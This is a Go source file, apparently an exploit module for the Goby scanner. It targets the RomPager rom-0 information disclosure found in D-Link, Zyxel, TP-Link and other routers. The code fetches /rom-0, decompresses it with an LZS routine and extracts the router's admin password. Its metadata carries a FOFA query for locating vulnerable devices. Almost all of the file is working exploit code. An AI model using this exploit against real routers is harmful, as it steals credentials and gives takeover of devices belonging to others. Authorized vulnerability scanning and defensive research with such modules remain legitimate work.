package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "Multi Router rom-0 Password Leakage",
    "Description": "visit /rom-0 and decompress data to get admin password",
    "Impact": "Multi Router rom-0 Password Leakage",
    "Recommendation": "update",
    "Product": "D-Link, Zyxel, TP-Link, Cisco, Huawei and so on",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "多款路由器存在用户密码泄漏漏洞",
            "Description": "<p><span style=\"color: rgb(34, 34, 34); font-size: 15.5px;\"><span style=\"font-size: 14px;\">AllegroSoft RomPager</span>是嵌入式Web服务器工具集，大量被应用于</span>D-Link, Zyxel, TP-Link, Cisco, Huawei等<span style=\"color: var(--primaryFont-color);\">多款路由器设备中。</span></p><p><span style=\"color: rgb(34, 34, 34); font-size: 15.5px;\"></span><span style=\"color: rgb(34, 34, 34); font-size: 15.5px;\"><span style=\"font-size: 14px;\">AllegroSoft RomPager</span>中存在用户密码信息泄漏漏洞，攻击者可通过该漏洞获取设备用户密码，从而获取设备权限。</span><br></p>",
            "Impact": "<p><span style=\"color: rgb(34, 34, 34); font-size: 15.5px;\"><span style=\"font-size: 14px;\">AllegroSoft RomPager&nbsp;</span>中存在用户密码信息泄漏漏洞，攻击者可通过该漏洞获取设备用户密码，从而获取设备权限。</span><br></p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://www.allegrosoft.com/\">https://www.allegrosoft.com/</a></p>",
            "Product": "RomPager",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Multi Router rom-0 Password Leakage",
            "Description": "visit /rom-0 and decompress data to get admin password",
            "Impact": "Multi Router rom-0 Password Leakage",
            "Recommendation": "update",
            "Product": "D-Link, Zyxel, TP-Link, Cisco, Huawei and so on",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "server=\"RomPager/4.07\"",
    "GobyQuery": "server=\"RomPager/4.07\"",
    "Author": "Ovi3",
    "Homepage": "https://www.allegrosoft.com/",
    "DisclosureDate": "2021-08-10",
    "References": [
        "https://github.com/EntySec/RomBuster"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "5.6",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "getAdminPwd",
            "show": ""
        }
    ],
    "ExpTips": {
        "type": "",
        "content": ""
    },
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "9687"
}`

	getRom0 := func(u *httpclient.FixUrl) string {
		cfg := httpclient.NewGetRequestConfig("/rom-0")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil && len(resp.RawBody) > 8568 {
			return resp.RawBody[8568:]
		}
		return ""
	}
	lzsDecompress := func(data string) (string, error) {
		br := newBitReader([]byte(data))
		res := ""
		var window []int
		for {
			bit, _ := br.ReadBit()
			if bit == 0 {
				char, _ := br.ReadNBits(8)
				res += string(char)
				window = append(window, char)
			} else {
				bit, _ = br.ReadBit()
				var offset int
				if bit == 1 {
					offset, _ = br.ReadNBits(7)
					if offset == 0 {
						break
					}
				} else {
					offset, _ = br.ReadNBits(11)
				}
				lenField, _ := br.ReadNBits(2)
				var length int
				if lenField < 3 {
					length = lenField + 2
				} else {
					lenField <<= 2
					t, _ := br.ReadNBits(2)
					lenField += t
					if lenField < 15 {
						length = (lenField & 0x0F) + 5
					} else {
						lenCounter := 0
						lenField, _ = br.ReadNBits(4)
						for lenField == 15 {
							lenField, _ = br.ReadNBits(4)
							lenCounter += 1
						}
						length = 15*lenCounter + 8 + lenField
					}
				}
				for i := 0; i < length; i++ {
					index := len(window) - offset
					if index < 0 || index >= len(window) {
						return "", errors.New("data format error")
					}
					char := window[index]
					res += string(char)
					window = append(window, char)
				}
			}
		}
		return res, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rom0 := getRom0(u)
			if len(rom0) == 0 {
				return false
			}
			r, err := lzsDecompress(rom0)
			if err != nil {
				return false
			}
			m := regexp.MustCompile(`([\x20-\x7e]{5,})`).FindStringSubmatch(r)
			if len(m) > 0 {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			if ss.Params["attackType"].(string) == "getAdminPwd" {
				rom0 := getRom0(expResult.HostInfo)
				if len(rom0) == 0 {
					return expResult
				}
				r, err := lzsDecompress(rom0)
				if err != nil {
					return expResult
				}
				m := regexp.MustCompile(`([\x20-\x7e]{5,})`).FindStringSubmatch(r)
				if len(m) > 0 {
					expResult.Success = true
					expResult.Output = "admin password is " + m[1]
					return expResult
				}
				return expResult
			}
			return expResult
		},
	))
}

type bitReader struct {
	Data            []byte
	Length          int
	Index           int
	currentBit      [8]byte
	currentBitIndex int
}

func newBitReader(data []byte) *bitReader {
	r := new(bitReader)
	r.Data = data
	r.Length = len(data)
	r.Index = 0
	r.currentBitIndex = 8
	return r
}

func (r *bitReader) ReadBit() (int, error) {
	if r.currentBitIndex < 8 {
		b := r.currentBit[r.currentBitIndex]
		r.currentBitIndex += 1
		return int(b), nil
	} else {
		if r.Index >= r.Length {
			return 0x00, errors.New("hit data end")
		}
		for i := 0; i < 8; i++ {
			r.currentBit[i] = (r.Data[r.Index] >> (7 - i)) & 0x1
		}
		r.Index += 1
		r.currentBitIndex = 0
		b := r.currentBit[r.currentBitIndex]
		r.currentBitIndex += 1
		return int(b), nil
	}
}

func (r *bitReader) ReadNBits(n int) (int, error) {
	res := 0
	for i := 0; i < n; i++ {
		b, err := r.ReadBit()
		if err != nil {
			return 0, err
		}
		res += b << (n - 1 - i)
	}
	return res, nil
}
